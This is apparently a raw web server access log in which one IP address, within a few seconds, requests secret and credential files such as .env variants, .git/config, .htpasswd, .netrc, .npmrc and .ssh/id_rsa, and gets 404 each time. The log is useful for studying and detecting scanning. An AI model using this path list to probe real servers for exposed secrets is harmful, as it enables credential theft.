154.83.103.144 - - [07/May/2025:14:27:24 +0000] "GET /.env.example HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:24 +0000] "GET /.env.local HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:24 +0000] "GET /.env.prod HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:24 +0000] "GET /.env.testing HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:25 +0000] "GET /.firebaserc HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:25 +0000] "GET /.git/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:25 +0000] "GET /.git/HEAD HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:25 +0000] "GET /.git/config HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:25 +0000] "GET /.git/index HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:26 +0000] "GET /.git/logs/HEAD HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:26 +0000] "GET /.gitattributes HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:26 +0000] "GET /.gitignore HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:26 +0000] "GET /.gitmodules HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:26 +0000] "GET /.hg/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:26 +0000] "GET /.htaccess HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:27 +0000] "GET /.htpasswd HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:27 +0000] "GET /.idea/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:27 +0000] "GET /.idea/.name HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:27 +0000] "GET /.login HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:27 +0000] "GET /.netrc HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:27 +0000] "GET /.nginx.conf HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:28 +0000] "GET /.npmrc HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:28 +0000] "GET /.profile HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:28 +0000] "GET /.ssh/config HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:28 +0000] "GET /.ssh/id_rsa HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
